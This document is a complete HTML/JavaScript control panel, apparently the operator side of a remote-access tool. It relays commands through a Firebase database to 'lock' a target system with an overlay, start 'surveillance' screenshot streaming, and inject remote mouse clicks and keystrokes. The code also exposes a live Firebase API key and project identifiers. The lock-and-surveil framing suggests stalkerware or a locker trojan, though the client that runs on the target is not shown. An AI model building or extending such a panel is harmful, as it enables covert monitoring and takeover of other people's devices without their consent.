<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced System Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
        body { font-family: 'Space Grotesk', sans-serif; background: #020617; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        #viewport-container img { user-drag: none; -webkit-user-drag: none; }
    </style>
</head>
<body class="min-h-screen text-slate-200 p-4 md:p-8">

    <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        <!-- Controls Sidebar -->
        <div class="lg:col-span-3 space-y-6">
            <div class="glass p-6 rounded-3xl shadow-2xl border-t-2 border-blue-500">
                <h1 class="text-xl font-bold mb-6 tracking-tighter">REMOTE TERMINAL</h1>
                
                <!-- Status -->
                <div class="mb-6 p-3 rounded-xl bg-black/40 border border-white/5">
                    <div class="flex items-center gap-2">
                        <div id="status-dot" class="w-2 h-2 rounded-full bg-slate-600"></div>
                        <span id="status-text" class="text-xs font-mono uppercase">Syncing...</span>
                    </div>
                </div>

                <!-- Command Buttons -->
                <div class="space-y-2 mb-6">
                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">System State</p>
                    <button onclick="setDb('overlay_active', true)" id="lock-btn" class="w-full py-3 bg-red-600 hover:bg-red-700 rounded-lg font-bold text-sm transition-all active:scale-95">LOCK SYSTEM</button>
                    <button onclick="setDb('overlay_active', false)" class="w-full py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-sm text-slate-400 transition-all active:scale-95">BYPASS</button>
                </div>

                <div class="space-y-2 mb-6">
                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">Surveillance</p>
                    <div class="flex gap-2">
                        <button onclick="setDb('stream_active', true)" id="start-stream-btn" class="flex-1 py-3 bg-emerald-600 hover:bg-emerald-700 rounded-lg text-xs font-bold transition-all active:scale-95">START LIVE</button>
                        <button onclick="setDb('stream_active', false)" id="stop-stream-btn" class="flex-1 py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs transition-all active:scale-95">STOP</button>
                    </div>
                </div>

                <!-- Typing Control -->
                <div class="space-y-2">
                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1">Remote Typing</p>
                    <div class="flex gap-2">
                        <input type="text" id="type-input" placeholder="Type here..." class="flex-1 bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-white">
                        <button onclick="sendText()" class="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95">Send</button>
                    </div>
                    <p class="text-[8px] text-slate-600 italic px-1">Press enter to send quickly</p>
                </div>
            </div>
        </div>

        <!-- Viewport -->
        <div class="lg:col-span-9">
            <div class="glass p-4 rounded-3xl h-full flex flex-col min-h-[600px]">
                <div class="flex items-center justify-between mb-3 px-2">
                    <div class="flex items-center gap-3">
                        <div id="live-indicator" class="w-2 h-2 rounded-full bg-red-500 animate-pulse hidden"></div>
                        <span class="text-[10px] font-bold tracking-widest uppercase opacity-50">Live Viewport (Click to Remote Click)</span>
                    </div>
                    <span id="timestamp" class="text-[10px] font-mono opacity-40">--:--:--</span>
                </div>
                
                <div id="viewport-container" class="relative flex-1 bg-black rounded-2xl overflow-hidden cursor-crosshair border border-white/10 group flex items-center justify-center">
                    <!-- Live Image Display -->
                    <img id="live-img" class="max-w-full max-h-full object-contain hidden" src="" onmousedown="remoteClick(event)" draggable="false" />
                    
                    <!-- Loader / Placeholder -->
                    <div id="loader" class="absolute inset-0 flex flex-col items-center justify-center text-slate-700">
                        <div class="w-8 h-8 border-2 border-slate-800 border-t-blue-500 rounded-full animate-spin mb-4"></div>
                        <p class="text-[9px] uppercase tracking-widest">Awaiting Link...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
            authDomain: "smsyy-f7bb7.firebaseapp.com",
            databaseURL: "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
            projectId: "smsyy-f7bb7",
            storageBucket: "smsyy-f7bb7.firebasestorage.app",
            messagingSenderId: "199149027655",
            appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function setDb(path, val) { 
            database.ref('system_settings/' + path).set(val); 
        }

        // Remote Clicking Logic
        function remoteClick(e) {
            const img = document.getElementById('live-img');
            const rect = img.getBoundingClientRect();
            
            // Calculate relative coordinates (0 to 1) based on the image size
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            
            // Send to Firebase with a timestamp to ensure the listener triggers every time
            database.ref('system_settings/mouse_click').set({
                x: x,
                y: y,
                ts: Date.now()
            });
        }

        // Remote Typing Logic
        function sendText() {
            const input = document.getElementById('type-input');
            const text = input.value;
            if(text) {
                // We append a small delay or clear to ensure consecutive identical messages trigger
                database.ref('system_settings/remote_typing').set(text);
                input.value = "";
                // Briefly reset typing path to allow same text again later
                setTimeout(() => {
                    database.ref('system_settings/remote_typing').set("");
                }, 500);
            }
        }

        // Enter key to send text
        document.getElementById('type-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendText();
        });

        // Status Listener
        database.ref('system_settings/overlay_active').on('value', (s) => {
            const active = s.val();
            const dot = document.getElementById('status-dot');
            const txt = document.getElementById('status-text');
            const btn = document.getElementById('lock-btn');
            
            if(active) {
                txt.innerText = "SYSTEM LOCKED";
                txt.className = "text-xs font-mono uppercase text-red-500 font-bold";
                dot.className = "w-2 h-2 rounded-full bg-red-500 animate-pulse";
                btn.innerText = "LOCKED";
                btn.classList.replace('bg-red-600', 'bg-red-900');
            } else {
                txt.innerText = "ONLINE / READY";
                txt.className = "text-xs font-mono uppercase text-emerald-500";
                dot.className = "w-2 h-2 rounded-full bg-emerald-500";
                btn.innerText = "LOCK SYSTEM";
                btn.classList.replace('bg-red-900', 'bg-red-600');
            }
        });

        // Stream Status UI
        database.ref('system_settings/stream_active').on('value', (s) => {
            const isStreaming = s.val();
            document.getElementById('live-indicator').classList.toggle('hidden', !isStreaming);
        });

        // Screenshot Image Listener
        database.ref('system_settings/last_screenshot').on('value', (s) => {
            const b64 = s.val();
            const img = document.getElementById('live-img');
            const loader = document.getElementById('loader');
            if(b64) {
                img.src = b64;
                img.classList.remove('hidden');
                loader.classList.add('hidden');
                document.getElementById('timestamp').innerText = "LIVE: " + new Date().toLocaleTimeString();
            }
        });
    </script>
</body>
</html>
